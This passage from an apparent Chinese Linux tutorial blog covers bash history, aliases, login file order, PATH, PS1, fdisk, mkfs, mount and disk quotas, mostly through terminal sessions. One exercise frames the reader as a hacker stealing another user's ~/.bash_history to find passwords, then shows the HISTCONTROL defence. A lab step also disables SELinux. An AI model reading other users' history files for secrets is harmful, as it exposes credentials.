虚拟接口。此外, 它也被 DJGPP 项目移植到了 MS- DOS 上。 POSIX shell : POSIX shell 与 Korn shell 非常的相似, 当前提供 POSIX shell 的最大卖主是Hewlett-Packard 。 为什么 Shell 解决重复操作的作业。 节约时间 , 提高工作效率。 功能强大,使用简单 /etc/shells/etc/shells 文件记录了目前系统中注册过的 shell,每一个用户可以使用一种 shell,可以通过usermod -s 来修改用户 shell,也可以通过chsh 来更改 shell 12345678[root@redhat6 tmp]# chsh carolChanging shell for carol.New shell [/bin/csh]: /bin/shShell changed.[root@redhat6 tmp]# su - carol-sh-4.1$ tail /etc/passwd -n1carol:x:60000:60000:carol:/home/carol:/bin/sh-sh-4.1$ bash 功能history 功能history 命令用于显示指定数目的指令命令,读取历史命令文件中的目录到历史命令缓冲区和将历史命令缓冲区中的目录写入命令文件。 该命令单独使用时,仅显示历史命令,在命令行中,可以使用符号!执行指定序号的历史命令。 例如,要执行第 2 个历史命令,则输入!2。 历史命令是被保存在内存中的,当退出或者登录 shell 时,会自动保存或读取。在内存中,历史命令仅能够存储 1000 条历史命令,该数量是由环境变量 HISTSIZE 进行控制。 HISTSIZE 变量 –变量:反复调用的值,以$符号引用 定义方式:histsize 数字 临时生效 /etc/profile 里永久定义 保存位置:~/.bash_history 12345678910111213141516语法 history(选项)(参数)选项 -c :清空当前历史命令;-a :将历史命令缓冲区中命令写入历史命令文件中;-r :将历史命令文件中的命令读入当前历史命令缓冲区;-w:将当前历史命令缓冲区命令写入历史命令文件中。参数 打印最近的 n 条历史命令实例!8 使用第八个命令!Ser 使用该字符串开头的最近的命令!!调用上一条命令!$ 调用上一个命令的参数 = alt+.Ctrl+R 搜索最近包含字符串的命令123456789101112131415161718192021222324252627282930313233343536history 命令用法 history -c 清空缓存 -r 将~/.bash_history历史命令读入缓存 方便的调用 ！num !! 调用最近一次的命令 !关键字 实战 1.你是黑客，窃取别人的历史命令 ~/.bash_history 2.为了防止黑客，你怎么防止一些关键命令被窃取，比如配置用户密码，或者数据库密码等 [root@rhel7 ~]# echo &quot;uplooking123&quot;|passwd --stdin superman Changing password for user superman. passwd: all authentication tokens updated successfully. 1）清缓冲 2）删除文件 [root@rhel7 ~]# export HISTCONTROL=ignorespace [root@rhel7 ~]# echo 1 1 [root@rhel7 ~]# echo 2 2 [root@rhel7 ~]# echo 3 3 [root@rhel7 ~]# history 1 HISTCONTROL=ignorespace 2 exprot HISTCONTROL=ignorespace 3 export HISTCONTROL=ignorespace 4 echo 1 5 echo 2 6 history 别名 aliasalias 命令用来设置指令的别名。我们可以使用该命令可以将一些较长的命令进行简化。使用 alias 时,用户必须使用单引号’’ 将原来的命令引起来,防止特殊字符导致错误。 alias 命令的作用只局限于该次登入的操作。若要每次登入都能够使用这些命令别名,则可将相应的 alias 命令存放到 bash 的初始化文件/etc/bashrc 中。 123456789语法 alias(选项)(参数)选项-p :打印已经设置的命令别名。参数 命令别名设置:定义命令别名,格式为 “ 命令别名=‘ 实际命令 ’” 。实例 alias 新的命令=&apos; 原命令 -选项/参数&apos;alias grep=’grep --color=auto’ ~/.bashrc 针对单个用户生效 /etc/bashrc 针对全局生效 实战 我的工作路径在/tmp/justice/superman/dir1/，每天登陆的服务器都很累，因为要天天输入cd /tmp/justice/superman/dir1/,有什么办法能够轻松一点呢？让我少输入一点命令呢？ 取消我刚刚设置的别名unalias tab 键补全功能单击补全命令,如果没办法补全,双击可以显示以该字符串开始的文件名都有哪些。(或者命令都有哪些) 快捷键 Ctrl +A 跳行首 Ctrl +L 清屏 Ctrl +e 跳行尾 Ctrl +c 中断 Ctrl +R 搜索 ctrl +d logout 用户登录流程学习用户登录流程的意义: 我们之前有提到过几个变量,比如 histsize、比如 umask 等。这些功能都可以是针对于某一个用户去设置的。那么我们是怎么知道具体要把这些相关配置信息写入哪一个文件呢?哪一个文件是用于全局的变量的设置的,哪一个文件针对单个用户生效,哪一个文件里面的配置字段会覆盖之前的配置字段呢?这就要用到我们的用户登录流程了。 五个配置文件的顺序: 我们用户在登录的时候,会调用一系列的文件,这些文件包括 /etc/profile /etc/profile.d 目录下的所有文件 /.bash_profile ~/.bashrc /etc/bashrc 这是我们系统登录过程中用到的五个文件,我们一一来查看。 /etc/profile /etc/profile 里面包含了配置字段 include /etc/profile.d 。这个 include 代表扩展配置文件,当读取该文件的时候,会读取相应的一些扩展配置文件。 我们通常不会把所有的东西都往一个文件里面去写,一方面是由于全往一个文件里面去写会导致文件特别大,另一方面,不方便我们的修改文件的灵活度。我们要从一个大篇幅的配置文件中找到某一行,非常的累,那么我们就可以将配置文件也分门别类的去写。比如说我创建了一个新的程序,这个程序需要一些变量的设置,我就可以将这些变量写成一个新的文件,放在/etc/profile.d 目录下,那么当我读取 profile 的时候一样能够读到该文件,当我不需要那个程序了,我也不用去找这个配置字段了,直接把对应的配置文件删除就可以了吧。 ~/.bash_profile 接下来回去读/.bash_profile 文件,由于是家目录下的,这是属于用户个人本身的配置文件,也就是说,写在这个配置文件当中的变量,只针对对应的用户生效。该文件里写的内容一部分是去读取/.bashrc 文件,一部分写了 path 变量的相关内容。 12345678# .bash_profile# Get the aliases and functionsif [ -f ~/.bashrc ]; then. ~/.bashrcfi# User specific environment and startup programsPATH=$PATH:$HOME/binexport PATH PATH 变量PATH 变量是我们系统中的相关命令的路径。PATH 的作用,简化我们的命令写法。 我们执行的命令一般都在 PATH 指定的路径中,比如说我们的 useradd 命令,实际上执行的是/usr/sbin/useradd ,再比如说 touch 命令,实际上执行的是/bin/touch 命令。 123456789101112131415161718192021[root@mastera0 ~]# echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin[root@mastera0 ~]# which useradd/usr/sbin/useradd[root@mastera0 ~]# which touch/usr/bin/touch[root@mastera0 ~]# vim pathtest[root@mastera0 ~]# ll pathtest-rw-r--r--. 1 root root 26 Jun 24 16:58 pathtest[root@mastera0 ~]# chmod +x pathtest[root@mastera0 ~]# ll pathtest-rwxr-xr-x. 1 root root 26 Jun 24 16:58 pathtest[root@mastera0 ~]# pathtest-bash: pathtest: command not found[root@mastera0 ~]# ./pathtestthis is a PATH-test![root@mastera0 ~]# cp pathtest /usr/local/bin[root@mastera0 ~]# pathtestthis is a PATH-test![root@mastera0 ~]# which pathtest/usr/local/bin/pathtest 那么 PATH 也有一个读取顺序,优先会从第一个位置开始找,比如说我们去/usr/local/sbin 下面创建一个同名的可执行文件 pathtest,内容如下: 1234567891011[root@mastera0 ~]# vim pathtest[root@mastera0 ~]# cp pathtest /usr/local/sbin[root@mastera0 ~]# pathtestthis is a PATH-test![root@mastera0 ~]# ./pathtestNew! I am /usr/local/sbin this is a PATH-test![root@mastera0 ~]# pathtestthis is a PATH-test![root@mastera0 ~]# export PATH[root@mastera0 ~]# pathtestNew! I am /usr/local/sbin this is a PATH-test! 这个就是 PATH 的读取顺序,由于第二个 pathtest 命令的路径/usr/local/sbin 优先于第一个 pathtest 命令的路径/usr/local/bin,所以执行了第二个 pathtest即/usr/local/sbin/pathtest。然后我们把第二个 pathtest 删除 rm -rf /usr/local/sbin/pathtest,重新 export 一下PATH,export 是设置环境变量的意思。之后我们讲到脚本会去说 1234[root@mastera0 ~]# rm -rf /usr/local/sbin/pathtest[root@mastera0 ~]# export PATH[root@mastera0 ~]# pathtestthis is a PATH-test! 那么这时候再来看一下执行结果是不是又回来了。 最后,读完这两个/.bash_profile 和/.bashrc 以后,系统最后再去读/etc/bashrc。 这是我们整个的流程。先后读取顺序分别是 /etc/profile /etc/profile.d/* ~/.bash_profile ~/.bashrc /etc/bashrc 记住,后面写的变量会覆盖之前的变量值,所以我们想让哪些变量生效,就一定要清楚写在什么位置。 比如说,我希望只能够给 student 用户使用的别名应该写到~/.bashrc 目录下 我希望让全局生效的参数可以放置在/etc/profile 目录下。 Su 和 su -的区别:这就是用户登录流程要注意的事情,系统里面有个很典型的例子,就是 su Su 代表切换用户。用法是 su - 用户名,或者su 直接跟上用户名。前者叫标准切换,后者叫非标准切换。 非标准切换有些变量是拿不到的。所以你可以看到 su 之后,我们的位置还在切换之前的位置,而我们 su - 的位置已经切换到用户的家目录了。 那么是哪些变量没拿到呢? 我们来做个小实验。 演示 给 5 个配置文件的头部分别写上 echo &quot;xxx (配置文件名) start&quot;,尾部写上 echo &quot;xxxx(配置文件名) stop&quot; Man bash 可以告诉你登录流程的相关内容。 PS1 变量/etc/bashrc 中有一个变量 PS1,我们一起来看看他的作用。 man bash 后搜索 ps1 关键词 123456789101112\\d :代表日期,格式为 weekday month date,例如:&quot;Mon Aug 1&quot;\\H :完整的主机名称。例如:我的机器名称为:fc4.linux,则这个名称就是 fc4.linux\\h :仅取主机的第一个名字,如上例,则为 fc4,.linux 则被省略\\t :显示时间为 24 小时格式,如:HH:MM:SS\\T :显示时间为 12 小时格式\\A :显示时间为 24 小时格式:HH:MM\\u :当前用户的账号名称\\v :BASH 的版本信息\\w :完整的工作目录名称。家目录会以 ~代替\\W :利用 basename 取得工作目录名称,所以只会列出最后一个目录 :下达的第几个命令\\$ :提示字符,如果是 root 时,提示符为:# ,普通用户则为:$ the在 PS1 中设置字符序列颜色的格式为:[\\e[F;Bm] F为字体颜色,编号 30~37; B为背景色,编号 40~47 。 取消设置:[\\e[m] 颜色表1234567891011121314151617前景 背景 颜色30 40 黑色31 41 红色32 42 绿色33 43 黄色34 44 蓝色35 45 紫红色36 46 青蓝色37 47 白色代码意义0 OFF1 高亮显示4 underline7 反白显示8 不可见 举例: PS1=’[[\\e[32m]###[\\e[31m]\\u@[\\e[36m]\\h \\w]$[\\e[m]‘ [\\e[32m] 设置为绿色 ### 显示现在运行的是第几条命令 [\\e[31m] 设置为红色 \\u@ 当前用户的账号名称@ [\\e[36m] 青蓝色 \\h \\w \\h 仅取主机的第一个名字,\\w 是说:显示完整的路径,但是不知到为什么家他显示~而不是绝对路径。 [\\e[m] 使用来关闭颜色设置的。 要是你没有这个的话;那么,你的命令提示符,包括你通过命令提示符输出的东西都是和最后一次的颜色设置相同( 除了一些有特殊意义的文件 )。 这个配置写到哪里呢??? 如果只想让当前用户生效,那么应该在用户的根目录下的 “.bashrc”,在里头的最后一行加上,然后保存。然后 source .bashrc 或者 “. .bashrc” 或者注销一下。如果想让所有用户生效,该放哪里?思考题 Bash简介课后作业 要求 student 用户登录的时候获取 umask 值为 044, 并且该 值永久生效。 要求所有普通用户登录时, 最后获取到的 HISTSIZE 值为 500, 而 root 用户获取到的 HISTSIZE 的值为 1000 。 梳理一下五个文件的登录顺序。","link":"/2016/12/22/booboo_linux_base/07-Bash/"},{"title":"Linux 文件系统和磁盘管理","text":"文件系统资源虚拟化 Linux操作系统内核由6个部分组成： 进程调度与管理 主存管理和虚存管理 VFS和文件管理 设备管理 网络接口和通信 用来实现资源抽象 资源分配和资源共享等功能。 文件系统的概念操作系统中负责管理和存储文件信息的软件机构称为文件管理系统，简称文件系统。 从系统角度来看，文件系统是对文件存储设备的空间进行组织和分配，负责文件存储并对存入的文件进行保护和检索的系统。 具体地说，它负责为用户建立文件，存入、读出、修改、转储文件，控制文件的存取，当用户不再使用时撤销文件等。 文件系统的类型查看系统支持的文件系统ls /lib/modules/$(uname -r)/kernel/fs 系统目前已加载到内存中支持的文件系统more /proc/filesystems 文件系统的结构索引式文件系统(indexed allocation) 文件系统内的信息主要有: superblock:记录filesystem的整体信息,包括 inode/block的总量、使用量、剩余量, 以及文件系统的格式等; inode:记录文件属性,一个文件占一个inode,同时记录该文件数据所在的block 号码; block:实际记录文件的内容,若档案太大时,会占用多个 block 文件系统的区别rhel6123[root@rhel6 ~]# mkfsmkfs mkfs.ext2 mkfs.ext4 mkfs.msdosmkfs.cramfs mkfs.ext3 mkfs.ext4dev mkfs.vfatrhel7123[root@rhel7 ~]# mkfsmkfs mkfs.cramfs mkfs.ext3 mkfs.fat mkfs.msdos mkfs.xfsmkfs.btrfs mkfs.ext2 mkfs.ext4 mkfs.minix mkfs.vfat EXT4 Linux kernel 自 2.6.28 开始正式支持新的文件系统 Ext4。Ext4 是 Ext3 的改进版，修改了 Ext3 中部分重要的数据结构，而不仅仅像 Ext3 对 Ext2 那样，只是增加了一个日志功能而已。Ext4 可以提供更佳的性能和可靠性，还有更为丰富的功能，不向下兼容ext3。 XFS 针对海量小文件的存储及超大文件的存储有一些有时,但 EXT 系统相对稳定。XFS 是 Silicon Graphics，Inc. 于 90 年代初开发的文件系统。它至今仍作为 SGI 基于 IRIX 的产品（从工作站到超级计算机）的底层文件系统来使用。现在，XFS 也可以用于 Linux。XFS 的 Linux 版的到来是激动人心的，首先因为它为 Linux 社区提供了一种健壮的、优秀的以及功能丰富的文件系统，并且这种文件系统所具有的可伸缩性能够满足最苛刻的存储需求。 文件系统的简单操作 df 实例： 使用-h选项以KB以上的单位来显示，可读性高123456[#3#root@rhel6 ~]#df -hFilesystem Size Used Avail Use% Mounted on/dev/mapper/vg_rhel6-LogVol01 17G 3.0G 13G 19% /tmpfs 499M 72K 499M 1% /dev/shm/dev/vda1 477M 58M 390M 13% /boot/dev/mapper/vg_rhel6-LogVol00 380M 2.3M 354M 1% /home 查看全部文件系统：12345678910[#4#root@rhel6 ~]#df -aFilesystem 1K-blocks Used Available Use% Mounted on/dev/mapper/vg_rhel6-LogVol01 17535796 3127044 13494936 19% /proc 0 0 0 - /procsysfs 0 0 0 - /sysdevpts 0 0 0 - /dev/ptstmpfs 510368 72 510296 1% /dev/shm/dev/vda1 487652 58631 399325 13% /boot/dev/mapper/vg_rhel6-LogVol00 388480 2335 361569 1% /homenone 0 0 0 - /proc/sys/fs/binfmt_misc du 实例： 查看指定目录所占空间1234[#9#root@rhel6 ~]#du -s /var/140252 /var/[#10#root@rhel6 ~]#du -sh /var/137M /var/ 查看指定目录下的所有文件，包括隐藏文件12345678910111213141516171819202122232425262728293031323334353637[#16#root@rhel6 ~]#du -h /tmp8.0K /tmp/pulse-oCBy0hGD1JT64.0K /tmp/.X11-unix4.0K /tmp/.esd-04.0K /tmp/virtual-root.JyC7Qb8.0K /tmp/orbit-gdm4.0K /tmp/.ICE-unix8.0K /tmp/pulse-q5sECpImz7Ju48K /tmp[#15#root@rhel6 ~]#du -ha /tmp4.0K /tmp/pulse-oCBy0hGD1JT6/pid0 /tmp/pulse-oCBy0hGD1JT6/native8.0K /tmp/pulse-oCBy0hGD1JT60 /tmp/.X11-unix/X04.0K /tmp/.X11-unix0 /tmp/.esd-0/socket4.0K /tmp/.esd-04.0K /tmp/virtual-root.JyC7Qb4.0K /tmp/.X0-lock0 /tmp/orbit-gdm/linc-6c2-0-7846478690c680 /tmp/orbit-gdm/bonobo-activation-register-75c59b1ecf3edd6ad04cfcfd00000056.lock4.0K /tmp/orbit-gdm/bonobo-activation-server-75c59b1ecf3edd6ad04cfcfd00000056-ior0 /tmp/orbit-gdm/linc-6e5-0-3bda60586d2f00 /tmp/orbit-gdm/linc-6bb-0-2bf2fd0bb015c0 /tmp/orbit-gdm/linc-6e1-0-44f3459db98f90 /tmp/orbit-gdm/linc-6d9-0-26db8cdee8dec0 /tmp/orbit-gdm/linc-6e0-0-7f7b8d46645930 /tmp/orbit-gdm/linc-6e4-0-540f978681aee0 /tmp/orbit-gdm/linc-6d4-0-3a04cbe95660 /tmp/orbit-gdm/linc-6d5-0-75caf0f81ab488.0K /tmp/orbit-gdm0 /tmp/.ICE-unix/17234.0K /tmp/.ICE-unix4.0K /tmp/pulse-q5sECpImz7Ju/pid0 /tmp/pulse-q5sECpImz7Ju/native8.0K /tmp/pulse-q5sECpImz7Ju48K /tmp 磁盘的分割、格式化与挂载新增一颗硬盘时 , 该怎么做 : 对磁盘进行分割 , 以建立可用的分区 partition ; 对该 partition 进行格式化 ( format ), 以建立系统可用的文件系统 filesystem; 若想要仔细一点 , 则可对刚刚建立好的 filesystem 进行检验 ;&lt;fsck, badblocks&gt; 在 Linux 系统上 , 需要建立挂载点 ( 目录 ), 并将他挂载上来。 如果 ll /dev/ 新建的分区不存在,则使用 partx -a /dev/vdb 让新建的分区被读取生效,或者重启电脑 分割 fdiskfdisk命令用于观察硬盘实体使用情况，也可对硬盘分区。它采用传统的问答式界面。 语法 fdisk(选项)(参数) 选项 -b&lt;分区大小&gt;：指定每个分区的大小； -l：列出指定的外围设备的分区表状况； -s&lt;分区编号&gt;：将指定的分区大小输出到标准输出上，单位为区块； -u：搭配”-l”参数列表，会用分区数目取代柱面数目，来表示每个分区的起始地址； -v：显示版本信息。 参数 设备文件：指定要进行分区或者显示分区的硬盘设备文件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160[#20#root@rhel6 ~]#fdisk -lDisk /dev/vda: 21.5 GB, 21474836480 bytes16 heads, 63 sectors/track, 41610 cylindersUnits = cylinders of 1008 * 512 = 516096 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x000d166b Device Boot Start End Blocks Id System/dev/vda1 * 3 1018 512000 83 LinuxPartition 1 does not end on cylinder boundary./dev/vda2 1018 5179 2097152 82 Linux swap / SolarisPartition 2 does not end on cylinder boundary./dev/vda3 5179 41611 18361344 8e Linux LVMPartition 3 does not end on cylinder boundary.Disk /dev/vdb: 10.7 GB, 10737418240 bytes16 heads, 63 sectors/track, 20805 cylindersUnits = cylinders of 1008 * 512 = 516096 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x00000000Disk /dev/mapper/vg_rhel6-LogVol01: 18.4 GB, 18379440128 bytes255 heads, 63 sectors/track, 2234 cylindersUnits = cylinders of 16065 * 512 = 8225280 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x00000000Disk /dev/mapper/vg_rhel6-LogVol00: 419 MB, 419430400 bytes255 heads, 63 sectors/track, 50 cylindersUnits = cylinders of 16065 * 512 = 8225280 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x00000000[#21#root@rhel6 ~]#fdisk /dev/vdbDevice contains neither a valid DOS partition table, nor Sun, SGI or OSF disklabelBuilding a new DOS disklabel with disk identifier 0x23c41712.Changes will remain in memory only, until you decide to write them.After that, of course, the previous content won&apos;t be recoverable.Warning: invalid flag 0x0000 of partition table 4 will be corrected by w(rite)WARNING: DOS-compatible mode is deprecated. It&apos;s strongly recommended to switch off the mode (command &apos;c&apos;) and change display units to sectors (command &apos;u&apos;).Command (m for help): m &lt;== 输入 m 后 , 就会看到底下这些指令介绍Command actiona toggle a bootable flagb edit bsd disklabelc toggle the dos compatibility flagd delete a partition &lt;== 删除一个分区l list known partition typesm print this menun add a new partition &lt;== 新增一个分区o create a new empty DOS partition tablep print the partition table== 在屏幕上显示分割表q quit without saving changes&lt;== 不储存离开 fdisk 程序s create a new empty Sun disklabelt change a partition&apos;s system idu change display/entry unitsv verify the partition tablew write table to disk and exit&lt;== 将刚刚的动作写入分割表x extra functionality (experts only)Command (m for help): pDisk /dev/vdb: 10.7 GB, 10737418240 bytes16 heads, 63 sectors/track, 20805 cylindersUnits = cylinders of 1008 * 512 = 516096 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x23c41712 Device Boot Start End Blocks Id SystemCommand (m for help): nCommand action e extended p primary partition (1-4)pPartition number (1-4): 1First cylinder (1-20805, default 1):Using default value 1Last cylinder, +cylinders or +size{K,M,G} (1-20805, default 20805):Using default value 20805Command (m for help): pDisk /dev/vdb: 10.7 GB, 10737418240 bytes16 heads, 63 sectors/track, 20805 cylindersUnits = cylinders of 1008 * 512 = 516096 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x23c41712 Device Boot Start End Blocks Id System/dev/vdb1 1 20805 10485688+ 83 LinuxCommand (m for help): wThe partition table has been altered!Calling ioctl() to re-read partition table.Syncing disks.[#22#root@rhel6 ~]#ls /dev|grep vdbvdbvdb1[root@rhel7 ~]# fdisk /dev/vdbWelcome to fdisk (util-linux 2.23.2).Changes will remain in memory only, until you decide to write them.Be careful before using the write command.Device does not contain a recognized partition tableBuilding a new DOS disklabel with disk identifier 0x8366bb08.Command (m for help): pDisk /dev/vdb: 10.7 GB, 10737418240 bytes, 20971520 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk label type: dosDisk identifier: 0x8366bb08 Device Boot Start End Blocks Id SystemCommand (m for help): nPartition type: p primary (0 primary, 0 extended, 4 free) e extendedSelect (default p): pPartition number (1-4, default 1): 1First sector (2048-20971519, default 2048):Using default value 2048Last sector, +sectors or +size{K,M,G} (2048-20971519, default 20971519):Using default value 20971519Partition 1 of type Linux and of size 10 GiB is setCommand (m for help): pDisk /dev/vdb: 10.7 GB, 10737418240 bytes, 20971520 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk label type: dosDisk identifier: 0x8366bb08 Device Boot Start End Blocks Id System/dev/vdb1 2048 20971519 10484736 83 LinuxCommand (m for help): wThe partition table has been altered!Calling ioctl() to re-read partition table.Syncing disks. 磁盘格式化 mkfs rhel6实例：查看支持的文件系统；将/dev/vdb1格式化成ext4文件系统1234567891011121314151617181920212223[#23#root@rhel6 ~]#mkfsmkfs mkfs.cramfs mkfs.ext2 mkfs.ext3 mkfs.ext4 mkfs.ext4dev mkfs.msdos mkfs.vfat[#24#root@rhel6 ~]#mkfs.ext4 /dev/vdb1mke2fs 1.41.12 (17-May-2010)Filesystem label=OS type: LinuxBlock size=4096 (log=2)Fragment size=4096 (log=2)Stride=0 blocks, Stripe width=0 blocks655360 inodes, 2621422 blocks131071 blocks (5.00%) reserved for the super userFirst data block=0Maximum filesystem blocks=268435456080 block groups32768 blocks per group, 32768 fragments per group8192 inodes per groupSuperblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632Writing inode tables: doneCreating journal (32768 blocks): doneWriting superblocks and filesystem accounting information: doneThis filesystem will be automatically checked every 38 mounts or180 days, whichever comes first. Use tune2fs -c or -i to override. rhel7实例：查看支持的文件系统；将/dev/vdb1格式化成xfs文件系统12345678910111213[root@rhel7 ~]# mkfsmkfs mkfs.cramfs mkfs.ext3 mkfs.fat mkfs.msdos mkfs.xfsmkfs.btrfs mkfs.ext2 mkfs.ext4 mkfs.minix mkfs.vfat[root@rhel7 ~]# mkfs.xfs /dev/vdb1meta-data=/dev/vdb1 isize=256 agcount=4, agsize=655296 blks = sectsz=512 attr=2, projid32bit=1 = crc=0data = bsize=4096 blocks=2621184, imaxpct=25 = sunit=0 swidth=0 blksnaming =version 2 bsize=4096 ascii-ci=0 ftype=0log =internal log bsize=4096 blocks=2560, version=2 = sectsz=512 sunit=0 blks, lazy-count=1realtime =none extsz=4096 blocks=0, rtextents=0 挂载/etc/fstab /etc/filesystems: 系统指定的测试挂载文件系统类型 ; /proc/filesystems:Linux 系统已经加载的文件系统类型。 mount 的用法1) 标准用法 mount -t ext4 /dev/vdb1 /mnt/vdb1 2) 远程挂载 mount ip:/xx /xx `mount 172.25.254.250 : /content /mnt` &lt;== 远程挂载案例3) 其他选项: A.-o loop 挂载镜像文件 用法: mount -o loop 被挂载的文件 挂载点 例如: mount -o loop rhel-server-6.5-x86_64-dvd.iso /test B.-o ro 以只读方式挂载 用法: mount -o ro 被挂在的设备 挂载点 例如: mount -o ro /dev/vdb1 /test C.-o remount 重新挂载 用法: mount -o remount 被挂载的设备 挂载点 例如: mount -o remount,rw,auto / &lt;== 重新挂载根目录 mount -o remount,ro newdir &lt;== 重新挂载为只读 D.-t iso9660 挂载CD/DVD 用法: mount -t iso9660 被挂载的设备 挂载点 例如: mount -t iso9660 /dev/dvdrom /media/dvdrom mount 的查看df -h mount &lt;== 查看设备和目录挂载点的关系123456789[#27#root@rhel6 ~]#mount/dev/mapper/vg_rhel6-LogVol01 on / type ext4 (rw)proc on /proc type proc (rw)sysfs on /sys type sysfs (rw)devpts on /dev/pts type devpts (rw,gid=5,mode=620)tmpfs on /dev/shm type tmpfs (rw,rootcontext=&quot;system_u:object_r:tmpfs_t:s0&quot;)/dev/vda1 on /boot type ext4 (rw)/dev/mapper/vg_rhel6-LogVol00 on /home type ext4 (rw)none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw) umountumount [-fn] 设备文件名与挂载点 umount /mnt 注意事项: 对某个挂载点使用多次 mount ,会把之前的内容隐藏起来,只能看到最后一次挂载的设备文件里的内容 不要在挂载点里面执行 umount 命令,会报错 尽量不要在挂载点里执行 mount 挂载命令 mount 命令为临时生效 /etc/fstab 将永久生效 是否需要检测:非 0 代表检测,数字越小优先级越高 修改后保存,通过 mount -a让配置生效 磁盘配额 Quota如前面介绍章节讲到的类 Unix 系统最初设计理念就让许多人一起使用,多任务的操作系统,但是硬件的资源是固定有限 的,如果出现个小破坏份子不断的创建文件或下载电影,那么硬盘空间总有一天会被占满的吧,这时就需要 quota服务 帮助我们为每个用户限制可以使用的硬盘空间,一旦超出预算就不再允许他们使用。 作用和分类quota 的磁盘配额可以限制用户的硬盘可用空间或最大创建文件数量,并且还有软/硬限制的区别: 软限制:当达到软限制时会提示用户,但允许用户在规定期限内继续使用。 硬限制:当达到硬限制时会提示用户,且强制终止用户的操作。 相关命令quotacheckquotacheck命令通过扫描指定的文件系统，获取磁盘的使用情况，创建、检查和修复磁盘配额（quota）文件。执行quotacheck指令，扫描挂入系统的分区，并在各分区的文件系统根目录下产生quota.user和quota.group文件，设置用户和群组的磁盘空间限制。 语法 quotacheck(选项)(参数) 选项 -a：扫描在/etc/fstab文件里，有加入quota设置的分区； -d：详细显示指令执行过程，便于排错或了解程序执行的情形； -g：扫描磁盘空间时，计算每个群组识别码所占用的目录和文件数目； -R：排除根目录所在的分区； -u：扫描磁盘空间时，计算每个用户识别码所占用的目录和文件数目； -v：显示指令执行过程。 参数 文件系统：指定要扫描的文件系统。 quotaquota命令用于显示用户或者工作组的磁盘配额信息。输出信息包括磁盘使用和配额限制。 语法 quota(选项)(参数) 选项 -g：列出群组的磁盘空间限制； -q：简明列表，只列出超过限制的部分； -u：列出用户的磁盘空间限制； -v：显示该用户或群组，在所有挂入系统的存储设备的空间限制； -V：显示版本信息。 参数 用户或者工作组：指定要显示的用户或者工作组。 quotaonquotaon命令用于激活Linux内核中指定文件系统的磁盘配额功能。 语法 quotaon(选项)(参数) 选项 -a：开启在/ect/fstab文件里，有加入quota设置的分区的空间限制； -g：开启群组的磁盘空间限制； -u：开启用户的磁盘空间限制； -v：显示指令指令执行过程。 参数 文件系统：指定要激活磁盘配额功能的文件系统。 repquotarepquota命令以报表的格式输出指定分区，或者文件系统的磁盘配额信息。 语法 repquota(选项)(参数) 选项 -a：列出在/etc/fstab文件里，有加入quota设置的分区的使用状况，包括用户和群组； -g：列出所有群组的磁盘空间限制； -u：列出所有用户的磁盘空间限制； -v：显示该用户或群组的所有空间限制。 参数 文件系统：要打印报表的文件系统或者对应的设备文件名。 edquotaedquota 命令用于超级用户编辑其他用户的 quota 配额限制 格式为: “ edquota [参数] [用户]”。 参数 作用 -u 编辑用户的配额限制。 -g 编辑用户组的配额限制。 -r 通过 RPC 协议编辑远程的配额。 xfs_quotaxfs_quota 命令用于管理 XFS 文件系统的 quota 硬盘配额 格式为: “ quota [参数] 配额 文件系统 ” 。 参数 作用 -c 命令 以交换式或参数的形式设置要执行的命令。 -p 设置提示或报错信息的程序名称,默认为 xfs_quota。 -x 专家模式,能够对 quota 做更多复杂的配置。 实验rhel6 quota实验划分分区/dev/vdb2，格式化成ext4文件系统，并挂载在student家目录下使用，限制磁盘软限制为 3M、磁盘硬限制为 6M、文件软限制为 20 个且文件硬限制为 30 个 挂载时需要加上 -o usrquota,grpquota 选项 ：mount -o usrquota,grpquota /dev/vdb2 /home/student /etc/skel 需要的文件需要复制到家目录下 ：cp .bash* .gnome2 .mozilla -r /home/student 修改家目录权限 ：chown student.student /home/student ;setenforce 0 检测:quotacheck -cugm /home/student/ 检测结果 : aquota.group aquota.user &lt;== 只有 root 用户有读写权限 激活 :quotaon /home/student 打印磁盘配额的报告 :repquota /home/student 编辑edquota student 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263[root@rhel6 ~]# mount -o usrquota,grpquota /dev/vdb2 /home/student[root@rhel6 ~]# ll /home/studenttotal 16drwx------. 2 root root 16384 Jul 1 15:56 lost+found[root@rhel6 ~]# cd /etc/skel[root@rhel6 skel]# cp .bash* .gnome* .moz* -r /home/student[root@rhel6 skel]# ll /home/student -atotal 42drwxr-xr-x. 5 root root 4096 Jul 1 16:00 .drwxr-xr-x. 4 root root 1024 Jul 2 2015 ..-rw-r--r--. 1 root root 18 Jul 1 16:00 .bash_logout-rw-r--r--. 1 root root 176 Jul 1 16:00 .bash_profile-rw-r--r--. 1 root root 124 Jul 1 16:00 .bashrcdrwxr-xr-x. 2 root root 4096 Jul 1 16:00 .gnome2drwx------. 2 root root 16384 Jul 1 15:56 lost+founddrwxr-xr-x. 4 root root 4096 Jul 1 16:00 .mozilla[root@rhel6 skel]# chown student. /home/student -R[root@rhel6 skel]# setenforce 0[root@rhel6 skel]# quotacheck -cugm /home/student[root@rhel6 skel]# ll /home/studenttotal 32-rw-------. 1 root root 6144 Jul 1 16:03 